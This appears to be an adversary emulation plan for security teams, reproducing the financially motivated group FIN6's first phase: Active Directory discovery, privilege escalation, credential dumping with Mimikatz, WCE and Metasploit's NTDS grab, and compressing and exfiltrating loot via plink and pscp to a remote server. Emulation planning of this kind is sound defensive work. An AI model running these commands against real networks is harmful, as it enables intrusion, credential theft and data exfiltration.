# Preface

FIN6 operations can be interpreted as having two phases.  Each phase has several objectives.  The objectives are presented linearly as each objective enables subsequent objectives and phases.  That said, each organization can tailor this emulation to their individual use case, priorities, and available resources.  The assessing team can begin at any phase or objective but should do so understanding that each objective enables the succeeding objectives.  

Phase 1 is the pursuit of enabling objectives.  Phase 2, the operational effects phase of the emulation plan, is left to the discretion of the organization.  Three use cases are presented along with information relevant to emulation.  This emulation plan recommends procedures using the tools reported to have been used by FIN6.  "Alternative Procedures" are presented to address intelligence gaps and suggest procedures that are intended to be operationally representative.

# Phase 1 Overview

* Emulating FIN6 using tools such as Metasploit, Mimikatz, and PsExec.
* Phase 1 begins after a host is compromised, a payload is executed, and command and control is established.
* "Seek-and-deploy" style operation; the objective of Phase 1 is to compromise, discover, and escalate, in order to deploy an operational capability during Phase 2.

## Emulation Team Systems

* C2 Framework
  * [Metasploit Framework](https://metasploit.com/download)
  * [CobaltStrike](https://cobaltstrike.com/)
  * [KoadicC3](https://github.com/zerosum0x0/koadic)
* [ADFind](https://www.joeware.net/freetools/tools/adfind/index.htm)
* [7Zip](https://7-zip.org/download.html)
* [Putty/Plink/PSCP](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
* [Windows Credential Editor](https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip)
* [PsExec](https://download.sysinternals.com/files/PSTools.zip)
* [Scraper](https://github.com/ahhh/PSSE/blob/master/Scrape-Memory-CCs.ps1)
* [DNSCat Server](https://github.com/iagox86/dnscat2.git)
* [DNSCat PowerShell Client](https://github.com/lukebaggett/dnscat2-powershell)
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
* [SimulateRansomware](https://github.com/BlackBox-CSP/SimulateRansomware)
* [PS2EXE](https://gallery.technet.microsoft.com/scriptcenter/PS2EXE-GUI-Convert-e7cb69d5)

---

# Infrastructure

FIN6 infrastructure is likely comprised of distributed command and control (C2) servers and exfiltration servers.  FIN6 is reported to have conducted C2 over HTTPS.  As such, it would be wise to purchase, associate, and categorize a domain for each redirector.  [Let's Encrypt](https://letsencrypt.org) is a resource for free SSL/TLS certificates.

FIN6 uses separate servers for exfiltration.  They appear to purchase domain names that are similar/relevent to their target organization in order to blend in.  The group may very well use one server to exfiltrate Discovery data during Phase 1, and separate servers to exfiltrate PoS or payment data during Phase 2.  Specific server configuration very much depends on the C2 framework.  

Detailing specific infrastructure configuration is beyond the scope of this plan.  Please consult the following resources:

## Infrastructure Configuration
* [Cloud-based Redirectors for Distributed Hacking](https://blog.cobaltstrike.com/2014/14/cloud-based-redirectors-for-distributed-hacking/)
* [Infrastructure for Ongoing Red Team Operations](https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations)
* [HTTPS Payload and C2 Redirectors](https://bluescreenofjeff.com/2018-04-12-https-payload-and-c2-redirectors/)
* [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
* [A Deep Dive into Cobalt Strike Malleable C2](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)

The following represents a bare minimum but should be operationally representative of FIN6 infrastructure:

## Command and Control (C2) Servers

* ### Metasploit

  * 1 x Kali/Metasploit Machine

* ### CobaltStrike

  * 1 x Teamserver
  * 1 x Redirector

## Exfiltration Servers

* ### Phase 1 - Exfiltration

  * SSH - After conducting internal discovery, FIN6 has been reported to stage the resulting files, compress those files, and typically exfiltrate using SSH. <sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>.  In order to emulate this activity, you will need to set up an exfiltration server that is capable of receiving SSH connections.   

* ### Phase 2 - POS Exfiltration

  * DNS - FIN6 is reported to have exfiltrated POS data from compromised systems using DNS tunneling.<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>  In order to emulate this use case (Phase2 Scenario 1), you will need to set up an exfiltration server that is capable of receiving DNS requests and issuing DNS responses.  We further describe how to emulate this activity using dnscat2 in Phase 2.    

* ### Phase 2 - E-Commerce Exfiltration

  * HTTP - FIN6 is reported to have exfiltrated payment data resulting from it's Magecart Group 6 activity via HTTP POST.<sup>[10](https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/)</sup> In order to emulate this use case (Phase 2 Scenario 2), you will need to set up an exfiltration server capable of receiving HTTP POST requests.  Depending on how you intend to evaluate this scenario, a lightweight solution like Python's http.server may be appropriate.  This activity is further described in Phase 2.    

---

# Execution

## Step 1 - FIN6 Initial Access

As FIN6 appears to be monetarily motivated, they take a pragmatic approach toward delivery.  FIN6 has employed social engineering ala direct messages on LinkedIn, spear-phished, compromised e-commerce sites, and it has been suggested that they have negotiated or even purchased access to previously compromised networks.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[8](https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/)</sup> <sup>[11](https://proofpoint.com/us/threat-insight/post/fake-jobs-campaigns-delivering-moreeggs-backdoor-fake-job-offers)</sup> It is therefore, recommended for the purpose of threat emulation, that assessors approach delivery in the same manner.

For teams that intend to emulate the threat actor for every stage of the kill-chain and assess their organization’s ability to protect, as well as detect and respond it may be prudent to approach this step from a red team perspective.  Conduct reconnaissance and choose a method of delivery that has the highest likelihood of successful delivery and exploitation.  For teams that are primarily interested in assessing their organization’s ability to detect and respond to FIN6 activity, it may not be worth the investment of resources.  For these assessors, it is recommended that you assume breach using the C2 framework of your choice.  FIN6 has made use of CobaltStrike and Metasploit.  Koadic C2 may be a good option to emulate the more_eggs implant.  

## Step 2 - FIN6 Discovery

After gaining access to the target network, FIN6 enumerates the network and Active Directory (AD) environment.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> The second objective is to conduct internal reconnaissance.  The intent of Discovery is to identify opportunities for escalation, lateral movement, systems for staging, and systems of interest for the effects phase of the emulation.  FIN6 is believed to have used ADFind for this purpose on at least one occasion.  For the purposes of emulation, we suggest ADFind, as recent reporting states FIN6 has been known to use it.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup>  However, if ADFind is unavailable, we have suggested alternative methods which are native to the Windows environment.

### Procedures

#### 2.1 - Account Discovery: Domain Account (T1087.002)

Find all person objects and output the results to a text file.

##### FIN6 Procedure

```sh
adfind.exe -f (objectcategory=person) > ad_users.txt
```

##### Alternative Procedure (Command Prompt)

```sh
net user /domain > ad_users.txt
```

#### 2.2 - Remote System Discovery (T1018)

Identify all computer objects and output the results to a text file. 

##### FIN6 Procedure

```sh
adfind.exe -f (objectcategory=computer) > ad_computers.txt
```

##### Alternative Procedure (Command Prompt)

```sh
net group "Domain Computers" /domain > ad_computers.txt
```

#### 2.3 - Domain Trust Discovery (T1482)

Enumerate all Organizational Units (OUs) in the domain of the user running the command and output the results to a text file.

##### FIN6 Procedure

```sh
adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt
```

##### Alternative Procedure (PowerShell)

```sh
Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A
```

#### 2.4 - Domain Trust Discovery (T1482)

Performs a full forest search and dumps trust objects to a text file. 

##### FIN6 Procedure

```sh
adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt
```

##### Alternative Procedure (Command Prompt)

```sh
nltest /domain_trusts > ad_trustdmp.txt
```

#### 2.5 - System Network Configuration Discovery (T1016)

List subnets and output the results to a text file. 

##### FIN6 Procedure

```sh
adfind.exe -subnets -f (objectcategory=subnet) > ad_subnets.txt
```

##### Alternative Procedure (PowerShell)

```sh
Get-ADReplicationSubnet -Filter *
```

#### 2.6 - Permission Groups Discovery: Domain Groups (T1069.002)
List groups and output the results to a text file.

##### FIN6 Procedure

```sh
adfind.exe -f (objectcategory=group) > ad_group.txt
```

##### Alternative Procedure (PowerShell)

```sh
net group /domain > ad_group.txt
```

## Step 3 - FIN6 Privilege Escalation

The third objective is to escalate privileges.  Again, in this regard, FIN6 has taken a pragmatic approach.  Reporting suggests the group has purchased credentials, made heavy use of credential access, and used the “getsystem” modules included in publicly available penetration testing frameworks.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> FIN6 has been reported to further compromise the Windows domain by copying and exfiltrating the Active Directory database (NTDS.dit) file.<sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> The information therein enables the group to move freely throughout the domain and pursue their operational objectives.  

Privilege escalation can be challenging, it is recommended that you choose your initial target for “compromise” carefully.  In the event that the assessing team is unable to escalate privileges, this event can be “white-carded” with the granting of administrative rights to the compromised account.  This white-carded event could enable the assessing team to escalate via credential access as the procedures described herein require elevated privileges.  

### Procedures

#### 3.1 - Access Token Manipulation (T1134)

On at least one occasion, FIN6 was reported to have escalated privileges to SYSTEM by using the named-pipe impersonation technique featured in the Metasploit framework.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup>  The command below assumes a meterpreter session and specifies the use of technique 1, a named-pipe impersonation.

##### FIN6 Procedure

```sh
meterpreter> getsystem -t 1
```

##### Alternative Procedure

```sh
Import-Module PowerSploit
```

```sh
Get-System -ServiceName '#{ }' -PipeName '#{ }'
```

```sh
Example: Get-System -ServiceName 'mstdc' -PipeName 'mstdc'
```

#### 3.2 - OS Credential Dumping: LSASS Memory (T1003.001)

##### Meterpreter/Mimikatz

Reporting indicates that FIN6 has used Mimikatz on several occasions.<sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[8](https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup> While there are many variations of the tool, FIN6 has to date, favored the use of Metasploit and CobaltStrike for post-exploitation.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[8](https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup>  As such, the recommended procedure specifies using Mimikatz from a Meterpreter session.  This of course, requires a Meterpreter session and elevated privileges.  The commands below load Mimikatz into memory and attempt to retrieve wdigest credentials.  

##### FIN6 Procedure

```sh
meterpreter> load kiwi
meterpreter> creds_all
```

#### 3.3 - OS Credential Dumping: NTDS (T1003.003)

##### Metasploit ntdsgrab

Another technique reportedly used by FIN6 to achieve credential access and escalate privileges is to copy and exfiltrate the Active Directory NTDS.dit file.<sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>  Reporting indicates that on at least one occasion, the group is believed to have used Metasploit's psexec_ntdsgrab module.  This module authenticates to the domain controller, creates a volume shadow copy of the system drive, and downloads copies of the NTDS.dit and SYSTEM hive. Although this technique is herein classified as a privilege escalation technique, the group may execute this module during discovery and exfiltrate the resultant files with the rest of their discovery results.<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>  

Hashes must be retrieved from the NTDS.dit file.  There are a number of openly available tools that are capable of parsing this file, [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) is one such tool.  As this step is done locally and offline, the choice is left to the analyst.  

##### FIN6 Procedure

```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```

#### 3.4 - OS Credential Dumping: LSASS Memory (T1003.001)

##### Windows Credential Editor

In addition to Mimikatz and psexec_ntdsgrab, FIN6 is reported to use WCE to access credentials.<sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>  The command below dumps cleartext passwords stored by the digest authentication package.  

##### FIN6 Procedure

```sh
wce.exe -w
```

## Step 4 - FIN6 Collection and Exfiltration

After conducting internal discovery, FIN6 has been reported to stage the resulting files, compress those files, and typically exfiltrate using SSH. <sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>

### Procedures

#### 4.1 - Archive Collected Data: Archive via Utility (T1560.001)

FIN6 uses its renamed version of 7zip (7.exe), on the designated staging system, to compress the text files resulting from internal discovery.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>  This command adds the ad_* text files to the ad.7z archive and performs a level 3 compression.

##### FIN6 Procedure

```sh
7.exe a -mx3 ad.7z ad_*
```

#### 4.2 - Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002) <sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>

Initiate an interactive SSH session with a remote server.  FIN6 exfiltrates the text files resultant from the Discovery Phase via SSH.

##### FIN6 Procedure

```sh
plink -ssh #{user}@#{server}
```

```sh
Example: C:\>plink -ssh root@192.168.101.1
```

##### Alternative Procedure

```sh
pscp c:\windows\temp\ad_* -P {port} root@192.168.101.1:/temp/loot
```